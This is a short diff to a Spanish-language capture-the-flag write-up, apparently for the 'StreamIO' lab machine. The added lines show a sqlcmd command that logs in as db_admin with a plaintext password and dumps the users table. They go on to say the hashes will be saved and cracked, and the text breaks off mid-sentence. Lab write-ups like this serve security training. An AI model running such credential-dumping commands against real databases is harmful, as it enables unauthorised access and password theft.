@@ -350,8 +350,14 @@ sqlcmd -U db_admin -P 'B1@hx31234567890' -S localhost -d streamio_backup -Q "SEL
 ```
 
 Conseguimos encontrar la tabla `users`, listaremos su contenido
+```shell
+sqlcmd -U db_admin -P 'B1@hx31234567890' -S localhost -d streamio_backup -Q "SELECT * from users;"
+```
 
+Encontrando una lista de usuarios y hashes que no teníamos
+Nos los guardaremos en un archivo
 
+Vamos a crackearlos una vº
 
 
 
